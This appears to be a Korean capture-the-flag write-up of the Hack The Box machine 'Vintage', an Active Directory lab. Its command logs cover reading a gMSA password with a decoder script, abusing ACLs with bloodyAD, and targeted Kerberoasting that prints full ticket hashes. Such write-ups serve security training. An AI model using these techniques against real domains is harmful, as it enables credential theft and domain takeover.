---
tags:
  - type/machine
  - platform/htb
  - os/windows
  - status/solved
  - tech/ad/kerberoast
  - tech/ad/dcsync
  - tech/ad/acl-abuse
  - tech/ad/pth
  - tech/ad/bloodhound
  - tech/svc/smb
  - tech/exec/winrm
  - tech/cred/crack
  - tech/cred/spray
  - tech/cred/dpapi
type: machine
platform: htb
os: windows
ip: 10.129.231.205
domain: vintage.htb
ports: [53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389]
services: [domain, http, kerberos-sec, kpasswd5, ldap, mc-nmf, microsoft-ds, msrpc, ncacn_http, netbios-ssn]
status: solved
tech_count: 10
---
## Nmap
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ nnmap 10.129.231.205                                            
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-19 14:56 +0900
Nmap scan report for 10.129.231.205
Host is up (0.25s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-19 05:57:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
56717/tcp open  msrpc         Microsoft Windows RPC
56723/tcp open  msrpc         Microsoft Windows RPC
56742/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-19T05:58:17
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   247.09 ms 10.10.14.1
2   247.61 ms 10.129.231.205

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 154.85 seconds

```

## 초기 자격증명

제공된 자격증명 확인 `P.Rosa / Rosaisbest123` Kerberos 가능
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123
SMB         10.129.231.205  445    10.129.231.205   [*]  x64 (name:10.129.231.205) (domain:10.129.231.205) (signing:True) (SMBv1:False) (NTLM:False)                                                                                    
SMB         10.129.231.205  445    10.129.231.205   [-] 10.129.231.205\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED 

┌──(kali㉿kali)-[~/HTB/vintage]
└─$ netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                                
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\P.Rosa:Rosaisbest123 

```



## SMB - TCP 445
smb 공유폴더 확인
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k --shares
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                                
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\P.Rosa:Rosaisbest123 
SMB         dc01.vintage.htb 445    dc01             [*] Enumerated shares
SMB         dc01.vintage.htb 445    dc01             Share           Permissions     Remark
SMB         dc01.vintage.htb 445    dc01             -----           -----------     ------
SMB         dc01.vintage.htb 445    dc01             ADMIN$                          Remote Admin
SMB         dc01.vintage.htb 445    dc01             C$                              Default share
SMB         dc01.vintage.htb 445    dc01             IPC$            READ            Remote IPC
SMB         dc01.vintage.htb 445    dc01             NETLOGON        READ            Logon server share 
SMB         dc01.vintage.htb 445    dc01             SYSVOL          READ            Logon server share 

```

blood hound 실행
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ bloodhound-ce-python -c all -d vintage.htb -u P.Rosa -p Rosaisbest123 -ns 10.129.231.205 --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: vintage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 16 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FS01.vintage.htb
INFO: Querying computer: dc01.vintage.htb
WARNING: Could not resolve: FS01.vintage.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.231.205@53 answered The DNS operation timed out.
INFO: Done in 00M 52S
INFO: Compressing output into 20260319153925_bloodhound.zip

```

FS01.vintage.htb 컴퓨터는 두 그룹에 포함되어있음
![[Pasted image 20260319154154.png]]

```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ netexec ldap vintage.htb -u 'FS01$' -p fs01 -k
LDAP        vintage.htb     389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        vintage.htb     389    DC01             [+] vintage.htb\FS01$:fs01 

```


nxc로 실패 
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ netexec smb dc01.vintage.htb -u 'P.Rosa' -p 'Rosaisbest123' -k --generate-krb5-file vintage-krb5.conf
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                                
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\P.Rosa:Rosaisbest123 
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ cat vintage-krb5.conf 

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = VINTAGE.HTB

[realms]
    VINTAGE.HTB = {
        kdc = dc01.vintage.htb
        admin_server = dc01.vintage.htb
        default_domain = vintage.htb
    }

[domain_realm]
    .vintage.htb = VINTAGE.HTB
    vintage.htb = VINTAGE.HTB

```

KRB5_CONFIG 재설정
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ export KRB5_CONFIG=$(pwd)/vintage-krb5.conf
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ echo $KRB5_CONFIG
/home/kali/HTB/vintage/vintage-krb5.conf

```

fs01$  접근
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ kinit 'fs01$@VINTAGE.HTB'
Password for fs01$@VINTAGE.HTB: fs01
                                    
                                    
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ klist                    
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: fs01$@VINTAGE.HTB

Valid starting       Expires              Service principal
03/19/2026 15:54:24  03/20/2026 01:54:24  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 03/20/2026 15:54:22

```

ldap-utils 설치
```bash
sudo apt install ldap-utils
sudo apt install libsasl2-modules-gssapi-mit -y
```

GMSA 암호 추출
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ ldapsearch -LLL -H ldap://dc01.vintage.htb -Y GSSAPI \
-b 'DC=vintage,DC=htb' '(&(objectClass=msDS-GroupManagedServiceAccount))' \
msDS-ManagedPassword
SASL/GSSAPI authentication started
SASL username: fs01$@VINTAGE.HTB
SASL SSF: 256
SASL data security layer installed.
dn: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword:: AQAAACQCAAAQABIBFAIcAs31WuApgbezDQ3ch15biuyU8nqONT7auHq
 Ojvz9JBMbUCsRIGgUP2jGrCqFdQ7DCwX7zMOL8f7dvFsqdEx1ubHf6yi0zM7Y7rLFmhG1f5gIEvW2
 6YGLIt1yoK1HQ477SL2NVMDEL/sz1Vr5qRp3sAlEAa4RR4lCnLAHqspFkkjP0MJ0dzFDlWvCmaSEh
 SrISgOOUlIlEksGa5KrtEin7B+yv0Z1SlHemPtNxRVgPUqyIXUg66GY8pVR9xbWabzUq/tqEeA1UK
 G3pqbrJYOl+i2HPKSAFCl4S42U3VFKM/FuUICwQRUo9RWtn39U+0kZ3PHkgJYoDK9Uux2tgtpa0fo
 AAJsZMUAak3sc2MEQRIP7sqEEiRHOMPdq2mfc0TJrofqqYeaz5+r+6WkX/4UBGyuOwtXhMtYPLayS
 AVaP8AqTXKGeFEaZz9q4+0DfZRLTp3NokDueK7qazWYPozSIwQ3BPmwOR3a7mqhdr4+QwVz0g8iNB
 bttDx6Ilqy5wkZJjL7wmoZicTxlg4DAWmNyF4IRpH/gHviRNH3Jzv/bcbkzwAdhGA+l5rLn6mCD2g
 FdquH3hyBgwodlunU89d0l8calmpUp+ZNxGiYaDJc1q4tfiB6ITuj+6sxdWPZw80S7lEZnfyypd43
 3nuEZvobKCDf9rptJ8vc9RYhTeuBT/93S3TIAAN+1JBtRBgAA31dUaFAGAAA=

# refldap://ForestDnsZones.vintage.htb/DC=ForestDnsZones,DC=vintage,DC=htb

# refldap://DomainDnsZones.vintage.htb/DC=DomainDnsZones,DC=vintage,DC=htb

# refldap://vintage.htb/CN=Configuration,DC=vintage,DC=htb

```

https://malicious.link/posts/2022/ldapsearch-reference/
gmsa.py 확인
```python
#!/usr/bin/env python3
from impacket.structure import hexdump, Structure
import base64
import sys, getopt
# Source from: https://github.com/SecureAuthCorp/impacket/pull/770#issuecomment-589243865

class MSDS_MANAGEDPASSWORD_BLOB(Structure):
    structure = (
        ('Version','<H'),
        ('Reserved','<H'),
        ('Length','<L'),
        ('CurrentPasswordOffset','<H'),
        ('PreviousPasswordOffset','<H'),
        ('QueryPasswordIntervalOffset','<H'),
        ('UnchangedPasswordIntervalOffset','<H'),
        ('CurrentPassword',':'),
        ('PreviousPassword',':'),
        #('AlignmentPadding',':'),
        ('QueryPasswordInterval',':'),
        ('UnchangedPasswordInterval',':'),
    )

    def __init__(self, data = None):
        Structure.__init__(self, data = data)

    def fromString(self, data):
        Structure.fromString(self,data)

        if self['PreviousPasswordOffset'] == 0:
            endData = self['QueryPasswordIntervalOffset']
        else:
            endData = self['PreviousPasswordOffset']

        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]
        if self['PreviousPasswordOffset'] != 0:
            self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset']-self['PreviousPasswordOffset']]

        self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset']-self['QueryPasswordIntervalOffset']]
        self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:]

def main(argv):
    b64 = ""
    verbose = False
    try:
        opts, args = getopt.getopt(argv,"hvb:",["base64="])
    except getopt.GetoptError:
        print ('gmsa.py -b <msDS-ManagedPassword base64> -v (optional verbose)')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print ('gmsa.py -b <msDS-ManagedPassword base64> -v (optional verbose)')
            sys.exit()
        elif opt in ("-v"):
            verbose = True
        elif opt in ("-b", "--base64"):
            b64 = arg

    if b64 == "":
        print ('gmsa.py -b <msDS-ManagedPassword base64> -v (optional verbose)')
        sys.exit()

    test = base64.b64decode(b64)

    blob = MSDS_MANAGEDPASSWORD_BLOB()
    blob.fromString(test)
    if verbose == True:
        blob.dump()
        print("="*80)
        print("Cleartext Password")
        hexdump(blob['CurrentPassword'][:-2])
    from Cryptodome.Hash import MD4
    hash = MD4.new ()
    hash.update (blob['CurrentPassword'][:-2])
    print("="*80)
    print("NTHash: {}".format(hash.hexdigest()))
    print("="*80)

if __name__ == "__main__":
   main(sys.argv[1:])
```

gmsa.py 로 출력
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ python gmsa.py -b AQAAACQCAAAQABIBFAIcAs31WuApgbezDQ3ch15biuyU8nqONT7auHqOjvz9JBMbUCsRIGgUP2jGrCqFdQ7DCwX7zMOL8f7dvFsqdEx1ubHf6yi0zM7Y7rLFmhG1f5gIEvW26YGLIt1yoK1HQ477SL2NVMDEL/sz1Vr5qRp3sAlEAa4RR4lCnLAHqspFkkjP0MJ0dzFDlWvCmaSEhSrISgOOUlIlEksGa5KrtEin7B+yv0Z1SlHemPtNxRVgPUqyIXUg66GY8pVR9xbWabzUq/tqEeA1UKG3pqbrJYOl+i2HPKSAFCl4S42U3VFKM/FuUICwQRUo9RWtn39U+0kZ3PHkgJYoDK9Uux2tgtpa0foAAJsZMUAak3sc2MEQRIP7sqEEiRHOMPdq2mfc0TJrofqqYeaz5+r+6WkX/4UBGyuOwtXhMtYPLaySAVaP8AqTXKGeFEaZz9q4+0DfZRLTp3NokDueK7qazWYPozSIwQ3BPmwOR3a7mqhdr4+QwVz0g8iNBbttDx6Ilqy5wkZJjL7wmoZicTxlg4DAWmNyF4IRpH/gHviRNH3Jzv/bcbkzwAdhGA+l5rLn6mCD2gFdquH3hyBgwodlunU89d0l8calmpUp+ZNxGiYaDJc1q4tfiB6ITuj+6sxdWPZw80S7lEZnfyypd433nuEZvobKCDf9rptJ8vc9RYhTeuBT/93S3TIAAN+1JBtRBgAA31dUaFAGAAA=
================================================================================
NTHash: 97cfb75bbec2028f1c97975a5ab58e82
================================================================================

```

유효성 확인
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ netexec smb dc01.vintage.htb -u 'gmsa01$' -H '97cfb75bbec2028f1c97975a5ab58e82' -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                                
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\gmsa01$:97cfb75bbec2028f1c97975a5ab58e82 
```

열거

![[Pasted image 20260319161607.png]]
Genericall 3개 이상의 서비스 계정 보유
![[Pasted image 20260319161631.png]]


TGT 획득
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ impacket-getTGT -k -hashes :97cfb75bbec2028f1c97975a5ab58e82 'vintage.htb/gmsa01$'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in gmsa01$.ccache

```

ServiceManagers에 GMSA01$를 추가
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u 'GMSA01$' -p 97cfb75bbec2028f1c97975a5ab58e82 -f rc4 add groupMember ServiceManagers 'GMSA01$'
[+] GMSA01$ added to ServiceManagers

```

그룹이 변경되어 TGT 새로 발급
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ impacket-getTGT -k -hashes :97cfb75bbec2028f1c97975a5ab58e82 'vintage.htb/gmsa01$'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in gmsa01$.ccache

```

계정 비활성화 제거
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u 'GMSA01$' -p 97cfb75bbec2028f1c97975a5ab58e82 -f rc4 remove uac svc_sql -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql''s userAccountControl


┌──(kali㉿kali)-[~/HTB/vintage]
└─$ KRB5CCNAME=gmsa01\$.ccache bloodyAD -d vintage.htb -k --host "dc01.vintage.htb" remove uac svc_sql -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql''s userAccountControl

```

## targetkerberoast.py 사용
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ export KRB5CCNAME=$(pwd)/gmsa01\$.ccache
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ klist
Ticket cache: FILE:/home/kali/HTB/vintage/gmsa01$.ccache
Default principal: gmsa01$@VINTAGE.HTB

Valid starting       Expires              Service principal
03/19/2026 16:20:02  03/20/2026 02:20:02  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 03/20/2026 16:20:01

┌──(kali㉿kali)-[~/HTB/vintage]
└─$ python3 targetedKerberoast.py -d vintage.htb -u 'GMSA01$' -k --no-pass --dc-host dc01.vintage.htb
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (svc_sql)
$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$31bb8e5c8acebf865b193f42f483d6e8$f92f08bc7e085c3484d258b3ee1f62b49717e35412e1cf1b21154d7a33cd5a712819feef86c936bf582cfae576bc55e0bf0862bc159e2c155754206c0cd2c41e356426469b5d620941790db3cf1fbbfc1baa35119f60dc29f8c0e6630741458b61420b7851de517322a38f52180602f4bee8162abc38c1d5e4164c69b5dc69c0a678c940f26fe5f921282dc8719fdcfc6aef7ebc86a7858727eae5b9d49aba6dc813ec5a4b88fddb59440d54f8fe01207ed1ed9150fe5615bfe37695578071f51d1087288d953b0e4781440bca4f5b2596daafa50f50db63e22929a5fb453320bc1fc3a71be487d6d2b62610a31ffc1fc58ee65b0a17baf3bf54c377e4e47cd523ede229d2667cd2bad1bedcccfb36aa9356c1ac0ac97fcdbc104aeeb6960026a5f8e7bd7de37756b15b81bf797ffd5bf1635dd84c21dddce87e5f8cf027432db539a9cef71ac191dd4d9d464161b6fbf1cc513a20c5621ee45a79b31beb8f13705af6d586598019c2a12e1678e0664b4e965d35b2b91569bd86f93ee6b55ca35722e796da77cee1b89f270861e4902c321ee51f6a091de30095ead989da03728b7e4e39f762f99fe15c64e6cc8110a0bd60ecfc4836d9f93ca1c0279a0bc85fdb6ba4318493cfb8be9566c943f260e0dbb3c04eadc80d0e5c8ebdd5943983bf231b725d1e317951a9342b145c64adca0c2b7d02c6efdf50f6e949627f85521c3aa97975284d289a2f40b07504625639929465132eea39d55ccff9c18b7ff066957ab36639dbad586684add99726a261ceb9d8fab847fad5f3ef730450d6e08c57c11cb7f3cd5f9ff940a39637c65443c9d782a408d022b6a66539948f8835d8a77b2bd074b8376f1b241b4e1e3518d93344985566c8679c9aa17a3bbaf7ba877d348d5449c504dd3069881435241e9736a645fa3218a46e10ee6d74c267071ec8bdf355af99f66cd8361665927d1e04611f4d4adf928d0b099e387aca95c18c10f169532a578d1c048050861a678ef2f893a51a733bf72a2edca0581a0dcc8d4325ef3f575bdaa1b2d8142067b5c3d3242774614f3ffdcec887a2181c6be3965eb0a2f207c0725727d1e095159f62dbf620e80098e6009cf353ba443356202089013274e8eed5660a014f175021923689a5b68ff44900b02d655331c3b6d898d0884e0d2d6e8f99f89b4b16e3075de57c8f951f5039e9da52850e6ba23ce6341d5f74b4bfce5801bcec6c0a678ab69c5c59480134b3294629db0f9462d115c8f64e16221143b79c382d49f695ea5fef33471cfe0e115c4743a7c0e84bb5d8204c423ed96ff1eec47952f58b412f0b6e1fb6866cf3cf346d7de396f799a11d622f4d0764b4da012ad3dce180e83c8465fe5f9cd72951ef94e686b8921f3bea0ad337cbe8222ea397338b6da3cd6bf9f47ca13e5829cb6a31bca01936e0dd8b8d864ff3
[+] Printing hash for (svc_ldap)
$krb5tgs$23$*svc_ldap$VINTAGE.HTB$vintage.htb/svc_ldap*$7cda9a9f04b043dd364089a98546bb9f$6587da66ee85b7c78409225d587706e5b7d94bb10ce51aca2cd8574aeae8eeb3f46e1325c6ab63d16e4f961d9b65b1e8c6fe3a5ac788b0ec425840a68b77a984e539f70ab5c1b9d490a24e9b1ae8cbff994b7979d00736b9770a3540060d30acb01097b0da944353d1580eb5dc6597874ace77242b5b9bcad6f4f6502c81405fe0e828a35b2553f0e34b717a5192a9f2ab5b6c1b96b70b476a7e0004ce838a089a1a678cf3da7c8c045af84d5c62c96366c7f57c78518eb10c84b297ec78a503219b1ac0ac899e96c39e6dc9580706031ac87bbdc921d65d4d202210a0844de9dac9ea108ae40ade1d06d19d3ce09a9a6a05d548a66f43933ba5ddde6c84914316279ccfdd7788636ad1132c68061b1289045fbd8e8648cc700a1a29a87810841532733a4593c11142a335c2afbbacc722166ec7d86223d871d3289dddb98341c01c9c6306679bbab3718a248b77c798bda38a1143765d731212dcc87e068450cbcfefbf68a01c9865f4f97db241bfd8c0a0297789c7cf1171d273ea207b93995813b146ccd87d1a1f5b22a811855a21b1df38ce25a59430cb9058080965bb3752d72f8bd799eae793fa4d067ad1de05bd83d7e4793e8790657f123fbec14f7e02b29832caaae53d217542f335242ae9d42b2556b2f8b914691930d0bb28e821e5ce6ca339c3fa35194a4e69aec686374a28b5d57bbc6b6b4e382f222b9b1e1acf6eb934b46b8e406efaf16cc1f6692b9f50fd63d3e2c7fec9dd50e5334b1a28ae9c535ba55737b8d8f3b21e17fc340d6ff9c8a466d5dc68d4a4fa0d8a9600a91b2e1073e11bd5e2c0d30084a39844843cc8ec6aa02c7aca8a14aa0b1abf119b63bfde9b47214550631bce4cec765e3a8616cd67f9e18e5100520401e22ad3674ef939b5e8898259af5175fd176dce7f0ea5cf414ba0c0153dde0d087e432755263397ec519e1c43faa2be88e60ad0c51c7606567bf6bcb8a6acf276f7344f93f2b369de0be9f67b1e961aa9a35d5980bec7f254b3492014f1b56731e4defeac288ccf28062b54d310ccd3504aa5ef3f8aebb2ddaa8b40e437bdfd934aefdd820eb13c7d8f2a11835f63296a2a6d01b0dcacab595e0de6953ba3c70875e1178626e8bf51435606805fae76572858c1c90a9a4d24ca4585fa6dda03b1ca11a0d815ea42f83d7d7956039f7d80c768c170aff771792ef60e7287a913e66ac48a43b4bff76546e5d661fea2f4354f7b62c58dd4a44473f91a6427e3df5caa40518c1911e90e2d1460cb3034d8c5337456645c48b22ba5e296cd70adda2d494f9fd4202489aeb1b89feab0d6a6c01552a9a368bdb7a8daf3d5c4495ce6a49f6d7b7cdff5740fcdc87968a2ffce1172247f28e93f6160f8d27c444f3f938e47c0471dff7aaec3f0fd1fffaf629a2bef1ed815919606b619accb1bf532dd6a73b600b1aedf88
[+] Printing hash for (svc_ark)
$krb5tgs$23$*svc_ark$VINTAGE.HTB$vintage.htb/svc_ark*$da11934fb289006f303607f45bf932cf$eb68cf9955e512418a3b4e1cc33d9422c812c988db8d0864b3d2e91cf1519ed66ea0af2ad654ea90a50edbe6beb7b16ea3c1129fe35f7ad8a6e078c77b23201170c11dc0bee6b59e469059c3b7e66ed0ed53492b39974d97908f5b5856251e12c34391bb43b8c30a9695604a1c90d5f220c2b10f5029aed751b9dfea284e1c56f7e8411874c29d31df00d8a06d210bde8c962ca3dcc521c0b3d2c6e5abd714c2e949f560fab3e6fe0e5c0e79aee3e2710b9528d4e96e69239b31f6867015ac6c74dbbd293f871b6ea711f2ec0e12728f11412f235c7da2c616bfa10c5e8d9d2cd70ba1cf34e770c543974d528b1e58b5d342a8aa4a7bf1f8874d21fbbf2907d5f7938b02346748488aa6bfda1b0182e4dce2bc37f27372a73af5db575fc49cc2e880f4fdb97fd31762398d9f5da68e29b92c9d0d2b4710e527fb4d787b8f12b74f41224d97f98d55fa4dca6715321cbf725d22debf4cf8578429ede60e3244bc800bf74e7fdba0d8e2fe6d89085587c17bc8f8e7dea353cda8db3af78f3914cd5a48eb4d100944020766c29b442328a0686e72624717f7d2b38a864091f75705e3c30ba6378b0c44b6265af9e55569611067550219f6dfb82250ec260843380199e732f877e03825e9e3843b37b35ba37e88f26d47b7d0eeea2e9b0f00a670c5af6109a1b13dec23ca9316d4a3a280812f98f52d58c13c5ebfe745deaca6deced99b42b96ef47724833e250a1d8fa62d21ff93597f859b60b47c536f9c8d8c5919dd4486ca7807f7e2636ec685d73974242a97bf62aa07849981466caaff60a95079aeeac9673300c76026835541c24e6c0323a3aba0fa78e98aed9ddd5b383fd676ff351293980ff4f609dd15a690b1d46a1f2ef3ad09b0d263e6d2b54ae71a529de61eae80c15e1be28225b279b2e325ce4944384d02939e36e301c048dfe500da0c3192be28363f32ceb48e3a9f6cf3891a878d4d8eb851326a089f542f11402f53b0a11cf34302fe502958c9866cb5d31c64092246c158920805829af05673370f89f9e5856be5d8c175a9417507be9a0b6c034a576c79dabb41ecb38df365065d79835190e1397253c67241cc195d8ac66451578ccae2e8a6d0d285f9f48d8295aec06432c1e4eca6ebaea4165faee6364d96140c2c52806a1c76cd0089bca7be12ad1effbbb8a89031c920ab60e224aebf16bfcd1cba5a4a54a2b304f644ff74f42094a44c16ad79b531334613a0e1fd72b966bbda7d4748a428dd8144c67562a7e62cbdf0e3b8061c476bd1b387d136fd52db1bc5b69db68f08d626cabc280d1ded5df73ccbd077d7cba201fac627173775eb5e882ddbe7bf6c3ccbee70a217dbef3b6eaea9805b101c5ed238244d970080ed0cc6274900617c781c7f41652d731c814935eda4901357a74f8db4084416111fc7dbe01d5e929c6f6e2cc22be3



```




## bloodyAD/nxc를 통한 타켓 kerberoast 공격
각 사용자에게 SPN 부여
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u 'GMSA01$' -p 97cfb75bbec2028f1c97975a5ab58e82 -f rc4 set object svc_ldap servicePrincipalName -v 'http/whateverldap'
[+] svc_ldap''s servicePrincipalName has been updated
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u 'GMSA01$' -p 97cfb75bbec2028f1c97975a5ab58e82 -f rc4 set object svc_ark servicePrincipalName -v 'http/whateverark'
[+] svc_ark''s servicePrincipalName has been updated
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u 'GMSA01$' -p 97cfb75bbec2028f1c97975a5ab58e82 -f rc4 set object svc_sql servicePrincipalName -v 'http/whateversql'
[+] svc_ark''s servicePrincipalName has been updated

```

nxc 실행 시 Kerberoastable 해시 획득
```bash
┌──(kali㉿kali)-[~/HTB/vintage]
└─$ netexec ldap dc01.vintage.htb -u 'GMSA01$' -H 97cfb75bbec2028f1c97975a5ab58e82 -k --kerberoasting kerberoasting.hashes
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\GMSA01$:97cfb75bbec2028f1c97975a5ab58e82 
LDAP        dc01.vintage.htb 389    DC01             [*] Skipping disabled account: krbtgt
LDAP        dc01.vintage.htb 389    DC01             [*] Total of records returned 2
LDAP        dc01.vintage.htb 389    DC01             [*] sAMAccountName: svc_ldap, memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb, pwdLastSet: 2024-06-06 22:45:27.881830, lastLogon: <never>
LDAP        dc01.vintage.htb 389    DC01             $krb5tgs$23$*svc_ldap$VINTAGE.HTB$vintage.htb\svc_ldap*$e37bd995fc2242dffa700734386d3a87$4c449c018610ddd14fd8eb68a3952a0c1c4bdc02675e633df64194bf1ae59a8d7c4f3c531642500071b9c4f6c431c0d14b7fc4a89bd0008a87e83ea49a8337286bfde467d94059a710effb21881dadfb418c125952876c826dc3afb8a68b64c584a157d96c3f94ba9414fc17cd5bab499e37e82e4210dccfcbc9e56ead70d18abce88953550881918925691266f2822d2d4b4ffe58de7f985a82fb8ea2db54045c6161dbf313a547a2dcc77eaad53a0125eb6d8a26cc364f385a32212347cb5cf634f5aee7aa8607c19888e5451190aea392c66e0614615a6e869781db76300e86cea200b8760ea000a2d90fdaac792b18197b0076ec4ae4b191eab1b99afdc3c2b06abc824a3df8cd344388a6b595c551b488ee643c2d01d5a18f648a727a6c789c9dbce25ab109bb91130776bbb4194f858ab9fa1c863b78df18a0a0233233ecccb8b76797138b9b9e34790a074801033b9b814744fc58f8c92b234fbabdca38d99f1036c5a91086e3274f802afdb91d61117bf391fc5380ebeb94dacb76b2003672574cf5939fdd62c88c862615aae6b1ba9c9bf9ff9b72ec538c4b052c7f616c6a78773799f6879f30925ae5b2e03e909c2f7c6a77bb3cc1439fd1cdb6fca54033863765a9f39f8dadddfbd477d1152ccd3d4b09b516946191ffb533b9cf37927fe4f3ee15a035695b6d407a8ca0521df9ccd5851994081cf2d7fe9eba0038309640a9e3a37f5fccc3e9a08dd41f0435e191749df56ea6a6ed4d15fddf936adfd8d0d6da463ee7b2d8d280d6481fb76386c9cb2372a6a129ce6152fa98793fe7a3fead14d793cfd54d921f8cce6458591b8cd3f71b0d9113439135ef578caa7cd4082e80e85682aa20e86158af4123454fc5f700e9392b467ebcf0a385863499eb242aa87c4c80d2064c56dc6cdf8c3397d3197c3ce00701c2b65d99366d8f7e74da80ff559bf6297b3775609de2901e9